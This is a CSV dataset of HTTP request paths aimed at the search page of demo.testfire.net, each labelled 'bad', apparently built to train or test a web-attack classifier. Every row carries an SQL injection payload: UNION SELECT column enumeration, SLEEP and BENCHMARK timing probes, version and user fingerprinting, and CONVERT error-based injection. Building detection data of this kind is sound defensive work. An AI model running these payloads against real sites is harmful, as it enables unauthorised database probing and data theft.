path,content,host,class_flag
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT 1#,,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT 1-- ,,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),3",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),4",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),""'3",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),""'3'""#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),4#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT USER()-- ,,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT SLEEP(5)-- ,,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT USER(),SLEEP(5)-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT NULL-- ,,demo.testfire.net,['bad']
"/search.jsp?query= AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- ",,demo.testfire.net,['bad']
"/search.jsp?query= AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- ",,demo.testfire.net,['bad']
